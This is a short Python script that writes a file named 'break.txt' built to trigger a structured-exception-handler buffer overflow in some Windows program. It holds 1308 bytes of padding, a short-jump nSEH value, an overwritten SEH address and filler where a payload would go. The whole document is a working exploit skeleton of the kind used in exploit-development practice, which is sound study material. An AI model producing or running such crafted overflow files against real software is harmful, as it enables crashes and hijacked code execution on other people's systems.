#!/bin/python3

size = 2000

offset = 1308

nSEH = b"\xEB\x06\x90\x90"

SEH = b"\x27\x18\x08\x10" 

fill = b"D" * (size - offset - len(nSEH) - len(SEH))

buf = b"A" * offset + nSEH + SEH + fill

try:
    with open("break.txt","wb") as f:
        print("[+] Created Ident Evil File")
        f.write(buf)
        f.close()
except:
    print("[!] Error")
